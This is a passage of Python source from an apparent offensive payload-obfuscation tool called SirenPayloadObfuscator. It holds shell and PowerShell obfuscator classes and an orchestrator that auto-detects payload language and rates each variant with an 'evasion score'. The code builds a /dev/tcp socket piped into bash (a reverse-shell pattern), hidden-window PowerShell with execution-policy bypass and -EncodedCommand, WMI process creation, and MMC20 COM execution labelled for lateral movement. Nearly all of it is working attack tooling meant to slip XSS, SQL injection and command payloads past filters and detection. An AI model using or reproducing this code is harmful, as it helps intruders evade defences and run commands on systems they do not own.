    def obfuscate_dev_tcp_exec(self, payload: str, host: str = "127.0.0.1",
                               port: int = 8080) -> str:
        """exec-based /dev/tcp redirection."""
        with self._lock:
            self._stats["dev_tcp_exec"] += 1
            fd = random.randint(3, 9)
            return (
                f"exec {fd}<>/dev/tcp/{host}/{port};"
                f"cat <&{fd}|bash;exec {fd}>&-"
            )

    # ── Brace Expansion Commands ─────────────────────────────────────────
    def obfuscate_brace_commands(self, payload: str) -> str:
        """Use {cmd1,cmd2} brace expansion to build command strings."""
        with self._lock:
            self._stats["brace_commands"] += 1
            words = payload.split()
            result: List[str] = []
            for word in words:
                chars = ",".join(word)
                result.append(f"$(echo {{{chars}}} | tr -d ' ')")
            return " ".join(result)

    # ── Combined ─────────────────────────────────────────────────────────
    def obfuscate_combined(self, payload: str, level: ObfuscationLevel) -> str:
        """Apply multiple shell techniques based on level."""
        with self._lock:
            self._stats["combined"] += 1
            lv = _level_value(level)
            if lv == 1:
                return self.obfuscate_rev_pipe(payload)
            elif lv == 2:
                return self.obfuscate_base64_pipe(payload)
            elif lv == 3:
                return self.obfuscate_dollar_hex(payload)
            else:
                b64 = base64.b64encode(payload.encode()).decode()
                hex_b64 = "".join(f"\\x{ord(c):02x}" for c in b64)
                return f"eval $(echo -e '{hex_b64}'|base64 -d)"

    def get_all_variants(self, payload: str, count: int = 10) -> List[str]:
        """Generate multiple shell obfuscation variants."""
        methods: List[Callable] = [
            self.obfuscate_path_slice,
            self.obfuscate_dollar_hex,
            self.obfuscate_dollar_hex_split,
            self.obfuscate_echo_e,
            self.obfuscate_echo_e_octal,
            self.obfuscate_printf,
            self.obfuscate_xxd_reverse,
            self.obfuscate_rev_pipe,
            self.obfuscate_rev_double,
            self.obfuscate_base64_pipe,
            self.obfuscate_base64_eval,
            self.obfuscate_base64_nested,
            self.obfuscate_here_string,
            self.obfuscate_here_doc,
            self.obfuscate_fd_redirect,
            self.obfuscate_brace_commands,
        ]
        random.shuffle(methods)
        variants: List[str] = []
        for method in methods[:count]:
            try:
                variants.append(method(payload))
            except Exception as exc:
                logger.warning("Shell variant generation failed: %s", exc)
        return variants

    def get_stats(self) -> Dict[str, int]:
        with self._lock:
            return dict(self._stats)


# ════════════════════════════════════════════════════════════════════════════════
# POWERSHELL OBFUSCATOR
# ════════════════════════════════════════════════════════════════════════════════

class PowerShellObfuscator:
    """
    PowerShell payload obfuscation engine.

    Provides 11+ techniques for PowerShell payload transformation
    including -EncodedCommand, tick insertion, .NET reflection,
    WMI execution, and COM object methods.

    Usage:
        obf = PowerShellObfuscator()
        result = obf.obfuscate_encoded_command("Get-Process")
        print(result)  # powershell -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._stats: Dict[str, int] = defaultdict(int)
        logger.debug("PowerShellObfuscator initialized")

    # ── -EncodedCommand ──────────────────────────────────────────────────
    def obfuscate_encoded_command(self, payload: str) -> str:
        """Base64-encoded UTF-16LE command via -EncodedCommand."""
        with self._lock:
            self._stats["encoded_command"] += 1
            encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
            return f"powershell -EncodedCommand {encoded}"

    def obfuscate_encoded_command_noprofile(self, payload: str) -> str:
        """EncodedCommand with -NoProfile and -NonInteractive."""
        with self._lock:
            self._stats["encoded_command_noprofile"] += 1
            encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
            return (
                f"powershell -NoP -NonI -W Hidden -Exec Bypass "
                f"-EncodedCommand {encoded}"
            )

    # ── Invoke-Expression Aliases ────────────────────────────────────────
    def obfuscate_iex_alias(self, payload: str) -> str:
        """Use iex (Invoke-Expression alias) for execution."""
        with self._lock:
            self._stats["iex_alias"] += 1
            escaped = payload.replace("'", "''")
            return f"iex '{escaped}'"

    def obfuscate_iex_ampersand(self, payload: str) -> str:
        """Use & (call operator) for execution."""
        with self._lock:
            self._stats["iex_ampersand"] += 1
            escaped = payload.replace("'", "''")
            return f"& ([scriptblock]::Create('{escaped}'))"

    def obfuscate_iex_dot(self, payload: str) -> str:
        """Use dot-sourcing for execution."""
        with self._lock:
            self._stats["iex_dot"] += 1
            escaped = payload.replace("'", "''")
            return f". ([scriptblock]::Create('{escaped}'))"

    def obfuscate_iex_pipe(self, payload: str) -> str:
        """Pipe string to Invoke-Expression."""
        with self._lock:
            self._stats["iex_pipe"] += 1
            escaped = payload.replace("'", "''")
            return f"'{escaped}' | iex"

    # ── String Reverse ───────────────────────────────────────────────────
    def obfuscate_string_reverse(self, payload: str) -> str:
        """Reverse string via [char[]]$s[-1..-$s.Length] -join ''."""
        with self._lock:
            self._stats["string_reverse"] += 1
            reversed_payload = payload[::-1]
            escaped = reversed_payload.replace("'", "''")
            return (
                f"$s='{escaped}';"
                f"iex (-join([char[]]$s)[-1..-($s.Length)])"  # Note: this is the reversed reverse
            )

    def obfuscate_string_reverse_array(self, payload: str) -> str:
        """Reverse via [Array]::Reverse()."""
        with self._lock:
            self._stats["string_reverse_array"] += 1
            reversed_payload = payload[::-1]
            escaped = reversed_payload.replace("'", "''")
            var = _random_var_name()
            return (
                f"${var}=[char[]]'{escaped}';"
                f"[Array]::Reverse(${var});"
                f"iex (-join ${var})"
            )

    # ── Get-Variable ─────────────────────────────────────────────────────
    def obfuscate_get_variable(self, payload: str) -> str:
        """Access variables indirectly via Get-Variable cmdlet."""
        with self._lock:
            self._stats["get_variable"] += 1
            var = _random_var_name()
            escaped = payload.replace("'", "''")
            return (
                f"Set-Variable -Name {var} -Value '{escaped}';"
                f"iex (Get-Variable -Name {var} -ValueOnly)"
            )

    def obfuscate_get_variable_short(self, payload: str) -> str:
        """Short form Get-Variable (gv)."""
        with self._lock:
            self._stats["get_variable_short"] += 1
            var = _random_var_name()
            escaped = payload.replace("'", "''")
            return f"sv {var} '{escaped}';iex (gv {var} -vo)"

    # ── GCI Variable: ────────────────────────────────────────────────────
    def obfuscate_gci_variable(self, payload: str) -> str:
        """Access variables via Get-ChildItem Variable: provider."""
        with self._lock:
            self._stats["gci_variable"] += 1
            var = _random_var_name()
            escaped = payload.replace("'", "''")
            return (
                f"${var}='{escaped}';"
                f"iex (Get-ChildItem Variable:{var}).Value"
            )

    def obfuscate_gci_env(self, payload: str) -> str:
        """Store in environment and retrieve via GCI."""
        with self._lock:
            self._stats["gci_env"] += 1
            var = _random_var_name().upper()
            escaped = payload.replace("'", "''")
            return (
                f"$env:{var}='{escaped}';"
                f"iex (Get-ChildItem Env:{var}).Value"
            )

    # ── Tick Insertion ───────────────────────────────────────────────────
    def obfuscate_tick_insertion(self, payload: str) -> str:
        """Insert backticks within PowerShell keywords."""
        with self._lock:
            self._stats["tick_insertion"] += 1
            keywords = [
                "Invoke-Expression", "Invoke-Command", "Invoke-WebRequest",
                "Invoke-RestMethod", "Get-Process", "Get-Service",
                "Get-ChildItem", "Set-Variable", "Get-Variable",
                "New-Object", "Start-Process", "Write-Output",
                "Write-Host", "Read-Host", "Out-File",
                "Add-Type", "Import-Module", "Export-CSV",
                "ConvertTo-Json", "ConvertFrom-Json",
            ]
            result = payload
            for kw in keywords:
                if kw.lower() in result.lower():
                    # Insert ticks at random positions
                    ticked = ""
                    for i, ch in enumerate(kw):
                        ticked += ch
                        if i > 0 and i < len(kw) - 1 and random.random() < 0.4:
                            ticked += "`"
                    result = re.sub(re.escape(kw), ticked, result, flags=re.IGNORECASE)
            return result

    def obfuscate_tick_all(self, payload: str) -> str:
        """Insert ticks between every other character."""
        with self._lock:
            self._stats["tick_all"] += 1
            result: List[str] = []
            in_string = False
            quote_char = ""
            for i, ch in enumerate(payload):
                if ch in ("'", '"') and (i == 0 or payload[i - 1] != "\\"):
                    if not in_string:
                        in_string = True
                        quote_char = ch
                    elif ch == quote_char:
                        in_string = False
                result.append(ch)
                if not in_string and ch.isalpha() and i < len(payload) - 1:
                    if payload[i + 1].isalpha() and random.random() < 0.3:
                        result.append("`")
            return "".join(result)

    # ── String Format -f Operator ────────────────────────────────────────
    def obfuscate_format_operator(self, payload: str) -> str:
        """Build strings via -f format operator with indexed args."""
        with self._lock:
            self._stats["format_operator"] += 1
            chars = list(payload)
            # Shuffle character order for format string
            unique_chars = list(set(chars))
            random.shuffle(unique_chars)
            char_to_idx: Dict[str, int] = {c: i for i, c in enumerate(unique_chars)}
            fmt_parts = [f"{{{char_to_idx[c]}}}" for c in chars]
            fmt_string = "".join(fmt_parts)
            args = ",".join(f"'{c}'" if c != "'" else "'\"'\"'" for c in unique_chars)
            return f"iex ('{fmt_string}' -f {args})"

    def obfuscate_format_split(self, payload: str) -> str:
        """Format operator with split for word building."""
        with self._lock:
            self._stats["format_split"] += 1
            words = payload.split()
            parts: List[str] = []
            args: List[str] = []
            for i, word in enumerate(words):
                parts.append(f"{{{i}}}")
                args.append(f"'{word}'")
            fmt_string = " ".join(parts)
            return f"iex ('{fmt_string}' -f {','.join(args)})"

    # ── Byte Array Execution ─────────────────────────────────────────────
    def obfuscate_byte_array(self, payload: str) -> str:
        """Store payload as byte array and convert at runtime."""
        with self._lock:
            self._stats["byte_array"] += 1
            bytes_list = ",".join(str(b) for b in payload.encode("utf-8"))
            return (
                f"iex ([System.Text.Encoding]::UTF8.GetString("
                f"[byte[]]@({bytes_list})))"
            )

    def obfuscate_byte_array_unicode(self, payload: str) -> str:
        """Byte array with Unicode encoding."""
        with self._lock:
            self._stats["byte_array_unicode"] += 1
            bytes_list = ",".join(str(b) for b in payload.encode("utf-16-le"))
            return (
                f"iex ([System.Text.Encoding]::Unicode.GetString("
                f"[byte[]]@({bytes_list})))"
            )

    # ── .NET Reflection ──────────────────────────────────────────────────
    def obfuscate_dotnet_reflection(self, payload: str) -> str:
        """Use .NET reflection to invoke methods indirectly."""
        with self._lock:
            self._stats["dotnet_reflection"] += 1
            escaped = payload.replace("'", "''")
            return (
                f"[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp');"
                f"$c=[Microsoft.CSharp.CSharpCodeProvider]::new();"
                f"# Reflection-based execution of: {escaped[:20]}..."
                f"\n$sb=[scriptblock]::Create('{escaped}');& $sb"
            )

    def obfuscate_dotnet_type(self, payload: str) -> str:
        """Use [type] accelerator for reflection."""
        with self._lock:
            self._stats["dotnet_type"] += 1
            escaped = payload.replace("'", "''")
            return (
                f"$t=[type]'System.Management.Automation.ScriptBlock';"
                f"$m=$t.GetMethod('Create',[type[]]@([string]));"
                f"& ($m.Invoke($null,@('{escaped}')))"
            )

    def obfuscate_dotnet_activator(self, payload: str) -> str:
        """.NET Activator.CreateInstance for dynamic object creation."""
        with self._lock:
            self._stats["dotnet_activator"] += 1
            b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
            return (
                f"$d=[System.Convert]::FromBase64String('{b64}');"
                f"$s=[System.Text.Encoding]::Unicode.GetString($d);"
                f"iex $s"
            )

    # ── WMI Execution ────────────────────────────────────────────────────
    def obfuscate_wmi_execution(self, payload: str) -> str:
        """Execute payload via WMI process creation."""
        with self._lock:
            self._stats["wmi_execution"] += 1
            b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
            return (
                f"Invoke-WmiMethod -Class Win32_Process -Name Create "
                f"-ArgumentList 'powershell -EncodedCommand {b64}'"
            )

    def obfuscate_wmi_cim(self, payload: str) -> str:
        """WMI via CIM cmdlets (modern alternative)."""
        with self._lock:
            self._stats["wmi_cim"] += 1
            b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
            return (
                f"Invoke-CimMethod -ClassName Win32_Process -MethodName Create "
                f"-Arguments @{{CommandLine='powershell -enc {b64}'}}"
            )

    # ── COM Object Methods ───────────────────────────────────────────────
    def obfuscate_com_object(self, payload: str) -> str:
        """Use COM objects (WScript.Shell) for execution."""
        with self._lock:
            self._stats["com_object"] += 1
            escaped = payload.replace("'", "''")
            return (
                f"$wsh=New-Object -ComObject WScript.Shell;"
                f"$wsh.Run('powershell -c \"{escaped}\"',0,$false)"
            )

    def obfuscate_com_shell_application(self, payload: str) -> str:
        """COM via Shell.Application object."""
        with self._lock:
            self._stats["com_shell_app"] += 1
            escaped = payload.replace("'", "''")
            return (
                f"$sa=New-Object -ComObject Shell.Application;"
                f"$sa.ShellExecute('powershell','-c \"{escaped}\"','','',0)"
            )

    def obfuscate_com_mmc(self, payload: str) -> str:
        """COM via MMC20.Application for lateral movement."""
        with self._lock:
            self._stats["com_mmc"] += 1
            escaped = payload.replace("'", "''")
            return (
                f"$mmc=[activator]::CreateInstance("
                f"[type]::GetTypeFromProgID('MMC20.Application'));"
                f"$mmc.Document.ActiveView.ExecuteShellCommand("
                f"'powershell','-c \"{escaped}\"','',0)"
            )

    # ── Combined ─────────────────────────────────────────────────────────
    def obfuscate_combined(self, payload: str, level: ObfuscationLevel) -> str:
        """Apply multiple PowerShell techniques based on level."""
        with self._lock:
            self._stats["combined"] += 1
            lv = _level_value(level)
            if lv == 1:
                return self.obfuscate_tick_insertion(payload)
            elif lv == 2:
                return self.obfuscate_format_operator(payload)
            elif lv == 3:
                return self.obfuscate_byte_array(payload)
            else:
                inner = self.obfuscate_byte_array(payload)
                b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
                return (
                    f"powershell -NoP -W Hidden -Exec Bypass "
                    f"-EncodedCommand {b64}"
                )

    def get_all_variants(self, payload: str, count: int = 10) -> List[str]:
        """Generate multiple PowerShell obfuscation variants."""
        methods: List[Callable] = [
            self.obfuscate_encoded_command,
            self.obfuscate_encoded_command_noprofile,
            self.obfuscate_iex_alias,
            self.obfuscate_iex_ampersand,
            self.obfuscate_iex_pipe,
            self.obfuscate_string_reverse,
            self.obfuscate_string_reverse_array,
            self.obfuscate_get_variable,
            self.obfuscate_gci_variable,
            self.obfuscate_gci_env,
            self.obfuscate_tick_insertion,
            self.obfuscate_tick_all,
            self.obfuscate_format_operator,
            self.obfuscate_format_split,
            self.obfuscate_byte_array,
            self.obfuscate_byte_array_unicode,
            self.obfuscate_dotnet_reflection,
            self.obfuscate_dotnet_activator,
            self.obfuscate_wmi_execution,
            self.obfuscate_com_object,
            self.obfuscate_com_shell_application,
        ]
        random.shuffle(methods)
        variants: List[str] = []
        for method in methods[:count]:
            try:
                variants.append(method(payload))
            except Exception as exc:
                logger.warning("PowerShell variant generation failed: %s", exc)
        return variants

    def get_stats(self) -> Dict[str, int]:
        with self._lock:
            return dict(self._stats)


# ════════════════════════════════════════════════════════════════════════════════
# SIREN PAYLOAD OBFUSCATOR — ORCHESTRATOR
# ════════════════════════════════════════════════════════════════════════════════


class SirenPayloadObfuscator:
    """
    Orchestrates multi-language payload obfuscation with auto-detection,
    technique chaining, variant generation, and effectiveness scoring.

    Coordinates JSObfuscator, SQLObfuscator, CMDObfuscator, HTMLObfuscator,
    ShellObfuscator, and PowerShellObfuscator.

    Usage::

        engine = SirenPayloadObfuscator()
        report = engine.full_obfuscation(
            payloads=["<script>alert(1)</script>", "' OR 1=1 --"],
        )

        # Single payload with auto-detect
        result = engine.obfuscate("' OR 1=1 --", level=ObfuscationLevel.HEAVY)

        # Force language
        result = engine.obfuscate("whoami", language=PayloadLanguage.SHELL)
    """

    # ── Language detection heuristics ────────────────────────────────────

    LANG_SIGNATURES: List[Tuple[str, PayloadLanguage]] = [
        (r"<script|javascript:|onerror\s*=|onload\s*=|\.innerHTML", PayloadLanguage.JAVASCRIPT),
        (r"document\.write|alert\s*\(|String\.fromCharCode|eval\s*\(", PayloadLanguage.JAVASCRIPT),
        (r"SELECT\s|UNION\s|INSERT\s|UPDATE\s|DELETE\s|DROP\s|OR\s+\d+=\d+|AND\s+\d+=\d+",
         PayloadLanguage.SQL),
        (r"<img\s|<svg\s|<iframe\s|<body\s|<div\s|<a\s|<object\s|<embed\s",
         PayloadLanguage.HTML),
        (r"powershell|Invoke-Expression|IEX\s|EncodedCommand|-NoP\s|-W\s+Hidden",
         PayloadLanguage.POWERSHELL),
        (r"\bwhoami\b|\bcat\s|/etc/passwd|/bin/sh|/bin/bash|\brm\s+-rf|\bchmod\b",
         PayloadLanguage.SHELL),
        (r"\bcmd\.exe\b|\bnet\s+user\b|\btype\s|\bdel\s|\bcopy\s|\bdir\s",
         PayloadLanguage.CMD),
    ]

    def __init__(self) -> None:
        self._lock = threading.RLock()

        # Sub-engines (language → obfuscator)
        self._obfuscators: Dict[PayloadLanguage, Any] = {
            PayloadLanguage.JAVASCRIPT: JSObfuscator(),
            PayloadLanguage.SQL: SQLObfuscator(),
            PayloadLanguage.CMD: CMDObfuscator(),
            PayloadLanguage.HTML: HTMLObfuscator(),
            PayloadLanguage.SHELL: ShellObfuscator(),
            PayloadLanguage.POWERSHELL: PowerShellObfuscator(),
        }

        # State
        self._results: List[ObfuscationResult] = []
        self._payloads_processed: int = 0
        self._variants_generated: int = 0
        self._languages_used: Dict[str, int] = defaultdict(int)
        self._scan_phases: List[Dict[str, Any]] = []
        self._scan_start: float = 0.0
        self._scan_end: float = 0.0

        logger.info("SirenPayloadObfuscator initialized with %d language engines",
                     len(self._obfuscators))

    # ── Language Detection ───────────────────────────────────────────────

    def detect_language(self, payload: str) -> PayloadLanguage:
        """Auto-detect payload language from content patterns."""
        scores: Dict[PayloadLanguage, int] = defaultdict(int)
        for pattern, lang in self.LANG_SIGNATURES:
            if re.search(pattern, payload, re.IGNORECASE):
                scores[lang] += 1
        if scores:
            return max(scores, key=scores.get)
        return PayloadLanguage.UNKNOWN

    # ── Entropy Calculation ──────────────────────────────────────────────

    @staticmethod
    def _entropy(data: str) -> float:
        """Shannon entropy of a string."""
        if not data:
            return 0.0
        freq: Dict[str, int] = defaultdict(int)
        for ch in data:
            freq[ch] += 1
        length = len(data)
        return -sum(
            (count / length) * math.log2(count / length)
            for count in freq.values()
        )

    # ── Single Payload Obfuscation ───────────────────────────────────────

    def obfuscate(
        self,
        payload: str,
        language: Optional[PayloadLanguage] = None,
        level: ObfuscationLevel = ObfuscationLevel.MEDIUM,
    ) -> ObfuscationResult:
        """Obfuscate a single payload, auto-detecting language if needed."""
        with self._lock:
            lang = language or self.detect_language(payload)
            if lang == PayloadLanguage.UNKNOWN:
                lang = PayloadLanguage.SHELL  # Fallback

            obfuscator = self._obfuscators.get(lang)
            if not obfuscator:
                return ObfuscationResult(
                    original=payload,
                    obfuscated=payload,
                    language=lang.name,
                    level=level.name,
                )

            try:
                obfuscated = obfuscator.obfuscate_combined(payload, level)
            except Exception as exc:
                logger.warning("Obfuscation failed for %s: %s", lang.name, exc)
                obfuscated = payload

            entropy_orig = self._entropy(payload)
            entropy_obf = self._entropy(obfuscated)

            result = ObfuscationResult(
                original=payload,
                obfuscated=obfuscated,
                language=lang.name,
                level=level.name,
                techniques_applied=[level.name],
                size_original=len(payload),
                size_obfuscated=len(obfuscated),
                size_ratio=round(len(obfuscated) / max(len(payload), 1), 4),
                entropy_original=round(entropy_orig, 4),
                entropy_obfuscated=round(entropy_obf, 4),
                entropy_delta=round(entropy_obf - entropy_orig, 4),
                evasion_score=min(1.0, round(
                    0.3 + (entropy_obf - entropy_orig) * 0.15 +
                    min(len(obfuscated) / max(len(payload), 1) * 0.1, 0.3), 4
                )),
            )

            self._results.append(result)
            self._payloads_processed += 1
            self._languages_used[lang.name] += 1
            return result

    # ── Variant Generation ───────────────────────────────────────────────

    def generate_variants(
        self,
        payload: str,
        count: int = 10,
        language: Optional[PayloadLanguage] = None,
    ) -> List[ObfuscationResult]:
        """Generate multiple obfuscation variants of a payload."""
        with self._lock:
            lang = language or self.detect_language(payload)
            if lang == PayloadLanguage.UNKNOWN:
                lang = PayloadLanguage.SHELL

            obfuscator = self._obfuscators.get(lang)
            if not obfuscator:
                return []

            raw_variants = obfuscator.get_all_variants(payload, count)
            results: List[ObfuscationResult] = []

            entropy_orig = self._entropy(payload)

            for variant in raw_variants:
                entropy_v = self._entropy(variant)
                result = ObfuscationResult(
                    original=payload,
                    obfuscated=variant,
                    language=lang.name,
                    level="VARIANT",
                    size_original=len(payload),
                    size_obfuscated=len(variant),
                    size_ratio=round(len(variant) / max(len(payload), 1), 4),
                    entropy_original=round(entropy_orig, 4),
                    entropy_obfuscated=round(entropy_v, 4),
                    entropy_delta=round(entropy_v - entropy_orig, 4),
                    evasion_score=min(1.0, round(
                        0.3 + (entropy_v - entropy_orig) * 0.15 +
                        min(len(variant) / max(len(payload), 1) * 0.1, 0.3), 4
                    )),
                )
                results.append(result)
                self._results.append(result)

            self._variants_generated += len(results)
            self._languages_used[lang.name] += len(results)
            return results

    # ── Report Generation ────────────────────────────────────────────────

    def generate_report(self) -> ObfuscationReport:
        """Generate consolidated obfuscation report."""
        with self._lock:
            if not self._results:
                return ObfuscationReport()

            all_langs = list({r.language for r in self._results})
            all_levels = list({r.level for r in self._results})
            all_techniques = list({t for r in self._results for t in r.techniques_applied})

            avg_evasion = sum(r.evasion_score for r in self._results) / len(self._results)
            avg_size = sum(r.size_ratio for r in self._results) / len(self._results)
            avg_entropy = sum(r.entropy_delta for r in self._results) / len(self._results)

            best = max(self._results, key=lambda r: r.evasion_score)
            worst = min(self._results, key=lambda r: r.evasion_score)

            # Per-technique effectiveness
            tech_stats: Dict[str, Dict[str, Any]] = {}
            for lang_name, count in self._languages_used.items():
                lang_results = [r for r in self._results if r.language == lang_name]
                if lang_results:
                    tech_stats[lang_name] = {
                        "count": count,
                        "avg_evasion": round(
                            sum(r.evasion_score for r in lang_results) / len(lang_results), 4
                        ),
                        "avg_size_ratio": round(
                            sum(r.size_ratio for r in lang_results) / len(lang_results), 4
                        ),
                    }

            report = ObfuscationReport(
                total_payloads=self._payloads_processed,
                total_variants=self._variants_generated,
                languages_used=all_langs,
                levels_used=all_levels,
                techniques_used=all_techniques,
                results=list(self._results),
                avg_evasion_score=round(avg_evasion, 4),
                avg_size_ratio=round(avg_size, 4),
                avg_entropy_delta=round(avg_entropy, 4),
                best_technique=best.language,
                worst_technique=worst.language,
                best_evasion_score=best.evasion_score,
                worst_evasion_score=worst.evasion_score,
                technique_stats=tech_stats,
                duration_seconds=self._scan_end - self._scan_start if self._scan_end else 0.0,
            )

            logger.info(
                "Obfuscation report: %d payloads, %d variants, avg_evasion=%.2f",
                self._payloads_processed, self._variants_generated, avg_evasion,
            )
            return report

    # ── Full Obfuscation Pipeline ────────────────────────────────────────

    def full_obfuscation(
        self,
        payloads: List[str],
        levels: Optional[List[ObfuscationLevel]] = None,
        variants_per_payload: int = 5,
    ) -> ObfuscationReport:
        """
        Execute full obfuscation pipeline.

        For each payload:
            1. Auto-detect language
            2. Obfuscate at each level
            3. Generate variants
        """
        with self._lock:
            self._scan_start = time.time()

        lvls = levels or [ObfuscationLevel.LIGHT, ObfuscationLevel.MEDIUM,
                          ObfuscationLevel.HEAVY, ObfuscationLevel.EXTREME]

        for payload in payloads:
            t0 = time.time()
            lang = self.detect_language(payload)

            # Obfuscate at each level
            for level in lvls:
                self.obfuscate(payload, language=lang, level=level)

            # Generate variants
            self.generate_variants(payload, count=variants_per_payload, language=lang)

            with self._lock:
                self._scan_phases.append({
                    "phase": f"obfuscate_payload_{self._payloads_processed}",
                    "duration": time.time() - t0,
                    "language": lang.name,
                    "levels": len(lvls),
                    "variants": variants_per_payload,
                })

        with self._lock:
            self._scan_end = time.time()

        return self.generate_report()

    # ── Accessors ────────────────────────────────────────────────────────

    def get_results(self) -> List[ObfuscationResult]:
        with self._lock:
            return list(self._results)

    def reset(self) -> None:
        """Reset all obfuscation state."""
        with self._lock:
            self._results.clear()
            self._payloads_processed = 0
            self._variants_generated = 0
            self._languages_used.clear()
            self._scan_phases.clear()
            self._scan_start = 0.0
            self._scan_end = 0.0
            logger.info("SirenPayloadObfuscator state reset")

    def to_dict(self) -> Dict[str, Any]:
        """Serialize orchestrator state."""
        with self._lock:
            return {
                "payloads_processed": self._payloads_processed,
                "variants_generated": self._variants_generated,
                "languages_used": dict(self._languages_used),
                "total_results": len(self._results),
                "phases": list(self._scan_phases),
                "engines_available": [l.name for l in self._obfuscators],
                "duration": self._scan_end - self._scan_start if self._scan_end else 0.0,
            }
